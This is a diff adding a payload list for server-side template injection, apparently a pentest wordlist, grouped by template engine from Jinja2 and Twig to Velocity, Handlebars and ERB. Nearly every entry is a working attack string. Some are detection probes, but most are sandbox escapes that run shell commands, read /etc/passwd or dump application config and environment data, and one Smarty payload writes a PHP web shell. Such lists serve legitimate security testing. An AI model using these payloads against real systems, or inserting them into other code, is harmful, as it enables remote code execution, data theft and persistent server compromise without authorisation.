@@ -1,0 +1,114 @@
+# Server-Side Template Injection payloads — OWASP A03:2021
+# Coverage: Jinja2/Python, Twig/PHP, Smarty, FreeMarker/Java, Velocity,
+#           Pebble, Mako, Tornado, Handlebars/JS, Mustache, ERB/Ruby
+
+# ── Detection probes (math evaluation — engine-agnostic) ─────────────────────
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+*{7*7}
+@{7*7}
+{{7*'7'}}
+${7*'7'}
+${{7*7}}
+{{7*7}}{{7*7}}
+{7*7}
+[[7*7]]
+
+# ── Jinja2 (Python / Flask / Django) ─────────────────────────────────────────
+{{config}}
+{{config.items()}}
+{{settings}}
+{{self.__dict__}}
+{{request}}
+{{request.environ}}
+{{request.environ['PATH']}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{''.__class__.__bases__[0].__subclasses__()}}
+{{''.class.mro()[1].subclasses()}}
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{joiner.__init__.__globals__.os.popen('id').read()}}
+{{namespace.__init__.__globals__.os.popen('id').read()}}
+{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")}}{% endif %}{% endfor %}
+{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
+{{7*7}}ababab
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+
+# ── Twig (PHP / Symfony) ──────────────────────────────────────────────────────
+{{7*7}}
+{{7*'7'}}
+{{app}}
+{{app.request}}
+{{app.request.server.all|join(',')}}
+{{''|format('%p')}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
+{%set a=7*7%}{{a}}
+{% for key, value in app.request.server.all %}{{key}}:{{value}}{%endfor%}
+
+# ── Smarty (PHP) ─────────────────────────────────────────────────────────────
+{$smarty.version}
+{php}echo `id`;{/php}
+{php}echo phpinfo();{/php}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
+{literal}{$x=$_GET['cmd'];system($x);}{/literal}
+{if system('id')}{/if}
+{math equation="x" x="`id`"}
+
+# ── FreeMarker (Java) ─────────────────────────────────────────────────────────
+${7*7}
+${.data_model}
+${.main_template_name}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+<#assign classloader=object?api.class.protectionDomain.classLoader>
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(",")}
+<#assign uri=object?api.class.getResource("/").toURI()><#assign input=uri.create("file:///etc/passwd").toURL().openConnection()><#assign is=input.getInputStream()>${is.available()?c}
+
+# ── Velocity (Java) ───────────────────────────────────────────────────────────
+#set($e="e")
+$e.getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")
+#set($str=$class.inspect("java.lang.String").type)
+#set($chr=$class.inspect("java.lang.Character").type)
+#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
+$ex.waitFor()
+#foreach($i in [1..$ex.inputStream.available()])$str.valueOf($chr.toChars($ex.inputStream.read()))#end
+
+# ── Pebble (Java) ─────────────────────────────────────────────────────────────
+{{7*7}}
+{%raw%}{{7*7}}{%endraw%}
+{{_context.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(_context.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}}
+
+# ── Mako (Python) ─────────────────────────────────────────────────────────────
+${7*7}
+<% import os; x=os.popen('id').read() %> ${x}
+<%! import os %><%=os.popen('id').read()%>
+<%
+import subprocess
+x=subprocess.check_output(['id'])
+%>
+${x}
+
+# ── Tornado / Python ─────────────────────────────────────────────────────────
+{{7*7}}
+{% import os %}{{os.popen("id").read()}}
+{%import os%}{{os.system("id")}}
+
+# ── Handlebars (Node.js) ──────────────────────────────────────────────────────
+{{7*7}}
+{{this}}
+{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('id').toString();"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
+
+# ── ERB (Ruby on Rails) ───────────────────────────────────────────────────────
+<%= 7*7 %>
+<%= system("id") %>
+<%= `id` %>
+<%= IO.popen('id').read %>
+<%= require 'open3'; o,_=Open3.capture2('id'); o %>
+
+# ── Mustache / Handlebars detection ──────────────────────────────────────────
+{{.}}
+{{{.}}}
+{{!-- comment --}}
+{{#each .}}{{.}}{{/each}}
